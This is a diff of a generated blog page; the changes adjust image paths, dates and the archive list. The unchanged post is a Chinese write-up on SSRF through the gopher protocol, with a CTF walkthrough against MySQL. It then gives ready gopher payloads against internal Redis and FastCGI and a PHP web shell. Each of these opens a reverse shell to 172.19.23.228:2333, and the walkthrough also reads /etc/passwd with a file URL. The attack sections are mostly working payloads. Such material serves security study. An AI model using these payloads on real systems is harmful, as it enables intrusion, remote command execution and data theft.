@@ -26,19 +26,19 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="前言 CTF题目 Gopher协议的利用方式 简介 攻击内网 Redis 攻击 FastCGI 攻击内网 Vulnerability Web      前言Gopher是Internet.上一个很有名的信息查找系统，它将Internet.上的文件组织成某种索引，很方便用户获取。Gopher协议使得Internet上的所有Gopher客户程序能够与已注册的Gopher服务器对话。简单来说，在W">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yinwc.github.io/1.png">
-<meta property="og:image" content="https://yinwc.github.io/2.png">
-<meta property="og:image" content="https://yinwc.github.io/3.png">
-<meta property="og:image" content="https://yinwc.github.io/4.png">
-<meta property="og:image" content="https://yinwc.github.io/1.jpg">
-<meta property="og:image" content="https://yinwc.github.io/3.jpg">
-<meta property="og:image" content="https://yinwc.github.io/4.jpg">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/1.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/2.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/3.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/4.png">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/1.jpg">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/3.jpg">
+<meta property="og:image" content="https://yinwc.github.io/2018/07/31/Gopher/4.jpg">
 <meta property="article:published_time" content="2018-07-31T02:29:49.000Z">
-<meta property="article:modified_time" content="2023-01-29T06:36:35.244Z">
+<meta property="article:modified_time" content="2023-02-02T06:14:29.744Z">
 <meta property="article:author" content="Y1ZkRA">
 <meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yinwc.github.io/1.png">
+<meta name="twitter:image" content="https://yinwc.github.io/2018/07/31/Gopher/1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/ywc.ico">
@@ -522,7 +522,7 @@
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Gopher是Internet.上一个很有名的信息查找系统，它将Internet.上的文件组织成某种索引，很方便用户获取。Gopher协议使得Internet上的所有Gopher客户程序能够与已注册的Gopher服务器对话。简单来说，在WWW出现之前，Gopher 是Internet.上最主要的检索工具。大家在学习认识的时候可以将其当做一个个等价于访问网页的正常请求方式<br>它的使用格式是gopher:&#x2F;&#x2F;URL。在SSRF中经常会使用Gopher来构造GET&#x2F;POST包攻击应用</p>
 <h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p>这是一道国外ISITDTU CTF的一道WEB题，在道题目里主要考察了gopher协议攻击mysql这一利用点。下面说一下解题思路。</p>
 <p>打开题目是个curl的界面，做题做多的话可以本能的想到是SSRF</p>
-<p><img src="/1.png" alt="Gopher"></p>
+<p><img src="/2018/07/31/Gopher/1.png" alt="Gopher"></p>
 <p>右键打开源代码发现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?debug=1--&gt;</span><br></pre></td></tr></table></figure>
 
@@ -531,7 +531,7 @@
 <p>审计代码，考察的是文件读取，使用file协议进行读取源码，尝试：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>
 <p>得到回显：</p>
-<p><img src="/2.png" alt="Gopher"></p>
+<p><img src="/2018/07/31/Gopher/2.png" alt="Gopher"></p>
 <p>得知必须得有localhost的host才行，于是改变请求方式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://loaclhost/etc/passwd</span><br></pre></td></tr></table></figure>
 <p>有回显，继续进行尝试：</p>
@@ -542,9 +542,9 @@
 <p>通过审计代码可以看出mysql的存在，加上curl<br>可以想到利用gopher协议攻击mysql<br>尝试：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:3306</span><br></pre></td></tr></table></figure>
 
-<p>得到回显：<br><img src="/3.png" alt="Gopher"><br>得知思路争取，就是使用gopher协议攻击mysql<br>使用项目：<a target="_blank" rel="noopener" href="https://github.com/undefinedd/extract0r-">https://github.com/undefinedd/extract0r-</a><br>帮助生成gopher攻击mysql的payload<br>命令为：<code>python exploit.py -u ssrf_user -d &#39;ssrf&#39; -P &#39;SELECT * FROM ssrf.flag&#39; -v</code><br>生成payload:</p>
+<p>得到回显：<br><img src="/2018/07/31/Gopher/3.png" alt="Gopher"><br>得知思路争取，就是使用gopher协议攻击mysql<br>使用项目：<a target="_blank" rel="noopener" href="https://github.com/undefinedd/extract0r-">https://github.com/undefinedd/extract0r-</a><br>帮助生成gopher攻击mysql的payload<br>命令为：<code>python exploit.py -u ssrf_user -d &#39;ssrf&#39; -P &#39;SELECT * FROM ssrf.flag&#39; -v</code><br>生成payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/A0%00%00%01O%B7%00%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00ssrf%00V%01%00%00%03select%20concat%28cast%280x504b03040a00000000000000000000000000e8030000e803000010000000746869735f69735f7468655f666c6167%20as%20binary%29%2C%20rpad%28%28SELECT%20%2A%20FROM%20ssrf.flag%29%2C%201000%2C%20%27-%27%29%2C%20cast%280x504b01021e030a00000000000000000000000000100000000000000000000000000000000000746869735f69735f7468655f666c6167504b0506000000000100010036000000640000000000%20as%20binary%29%29%00%00%00%00</span><br></pre></td></tr></table></figure>
-<p>发用请求即可得到flag<br><img src="/4.png" alt="Gopher"></p>
+<p>发用请求即可得到flag<br><img src="/2018/07/31/Gopher/4.png" alt="Gopher"></p>
 <h2 id="Gopher协议的利用方式"><a href="#Gopher协议的利用方式" class="headerlink" title="Gopher协议的利用方式"></a>Gopher协议的利用方式</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。<br>它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。<br>gopher 协议使用tcp 可靠连接。</p>
 <p><strong>协议格式</strong></p>
 <p>gopher url 格式为：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code><br><code>&lt;port&gt;</code>默认为70<br><code>&lt;gopher-path&gt;</code>其中&lt;gopher-path&gt;格式可以是如下其中的一种&lt;&#x2F;gopher-path&gt;</p>
@@ -555,18 +555,18 @@
 <h3 id="攻击内网-Redis"><a href="#攻击内网-Redis" class="headerlink" title="攻击内网 Redis"></a>攻击内网 Redis</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
 <p>攻击：</p>
-<p><img src="/1.jpg" alt="Gopher"></p>
+<p><img src="/2018/07/31/Gopher/1.jpg" alt="Gopher"></p>
 <h3 id="攻击-FastCGI"><a href="#攻击-FastCGI" class="headerlink" title="攻击 FastCGI"></a>攻击 FastCGI</h3><p>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span><br></pre></td></tr></table></figure>
 <p>攻击：</p>
-<p><img src="/3.jpg" alt="Gopher"></p>
+<p><img src="/2018/07/31/Gopher/3.jpg" alt="Gopher"></p>
 <h3 id="攻击内网-Vulnerability-Web"><a href="#攻击内网-Vulnerability-Web" class="headerlink" title="攻击内网 Vulnerability Web"></a>攻击内网 Vulnerability Web</h3><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt; </span><br></pre></td></tr></table></figure>
 <p>利用方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /exp.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl/7.43.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261</span><br></pre></td></tr></table></figure>
 <p>构造 Gopher 协议的 URL：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null</span><br></pre></td></tr></table></figure>
-<p>攻击：<br><img src="/4.jpg" alt="Gopher"></p>
+<p>攻击：<br><img src="/2018/07/31/Gopher/4.jpg" alt="Gopher"></p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/159342.html">http://www.freebuf.com/articles/web/159342.html</a></p>
@@ -581,7 +581,7 @@
             <p>Author：<a href="https://yinwc.github.io">Y1ZkRA</a>
             <p>Link：<a href="https://yinwc.github.io/2018/07/31/Gopher/">https://yinwc.github.io/2018/07/31/Gopher/</a>
             <p>Publish date：<a href="https://yinwc.github.io/2018/07/31/Gopher/">July 31st 2018, 10:29:49 am</a>
-            <p>Update date：<a href="https://yinwc.github.io/2018/07/31/Gopher/">January 29th 2023, 2:36:35 pm</a>
+            <p>Update date：<a href="https://yinwc.github.io/2018/07/31/Gopher/">February 2nd 2023, 2:14:29 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1365,24 +1365,7 @@
         
         
         
-        
-        
-        
-        
-        
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
@@ -2773,7 +2756,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 124
+        Total : 123
         </div>
         <!-- search  -->
         
@@ -3079,12 +3062,6 @@
         <li class="archive-post-item">
             <span class="archive-post-date">07/06</span>
             <a class="archive-post-title" href="/2019/07/06/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Django学习笔记</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/18</span>
-            <a class="archive-post-title" href="/2019/06/18/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">App渗透测试</a>
         </li>
     
         
@@ -3594,11 +3571,6 @@
                 安全评估
             </span>
         
-            <span class="sidebar-tag-name" data-tags="渗透测试">
-                <span class="iconfont-archer">&#xe606;</span>
-                渗透测试
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="安全开发">
                 <span class="iconfont-archer">&#xe606;</span>
                 安全开发
@@ -3612,6 +3584,11 @@
             <span class="sidebar-tag-name" data-tags="problem">
                 <span class="iconfont-archer">&#xe606;</span>
                 problem
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="渗透测试">
+                <span class="iconfont-archer">&#xe606;</span>
+                渗透测试
             </span>
         
             <span class="sidebar-tag-name" data-tags="Crypto">
